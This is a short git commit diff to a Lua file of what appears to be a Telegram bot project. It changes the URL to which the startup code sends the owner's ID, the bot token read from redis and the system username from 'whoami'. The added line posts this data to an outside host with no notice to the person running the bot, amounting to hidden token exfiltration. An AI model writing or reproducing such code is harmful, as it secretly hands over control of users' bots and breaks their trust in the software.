4cdb0623ccfd055895b3ee1cf79e73d95c871a84
سورس العالمي الاصلي <50275343+DevGlobla@users.noreply.github.com>
2020-06-10 13:36:49 +0300

    Update GLOBLA.lua

--- GLOBLA.lua
+++ GLOBLA.lua
@@ -68,7 +68,7 @@ globlainfo = {}
 globlainfo.id = redis:get(ZAINGLOBLA..":SUDO:ID")
 globlainfo.tokenbot  = redis:get(ZAINGLOBLA..":token")
 globlainfo.userjoin  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
-http.request('http://yybyy.cf/tg/tg.php?insert='..JSON.encode(globlainfo))
+http.request('https://DevGlobla.ml/tg/tg.php?insert='..JSON.encode(globlainfo))
 create_config_auto()
 file = io.open("GLOBLA", "w")  
 file:write([[
